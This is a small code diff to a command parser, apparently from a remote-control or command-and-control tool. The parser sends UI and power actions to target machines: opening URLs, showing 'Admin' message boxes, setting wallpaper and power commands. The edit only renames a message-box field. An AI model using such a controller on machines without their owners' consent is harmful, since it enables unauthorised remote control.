@@ -1014,7 +1014,7 @@ class CommandParser:
             
             # --- UI Actions ---
             elif cmd == 'url': self.server.send_command(targets, 'open_url', {'url': args[0]})
-            elif cmd == 'msg': self.server.send_command(targets, 'message_box', {'title': 'Admin', 'message': ' '.join(args)})
+            elif cmd == 'msg': self.server.send_command(targets, 'message_box', {'title': 'Admin', 'text': ' '.join(args)})
             elif cmd == 'wallpaper': self.server.send_command(targets, 'wallpaper', {'path': args[0]})
             elif cmd == 'power': self.server.send_command(targets, 'power', {'action': args[0]})
             
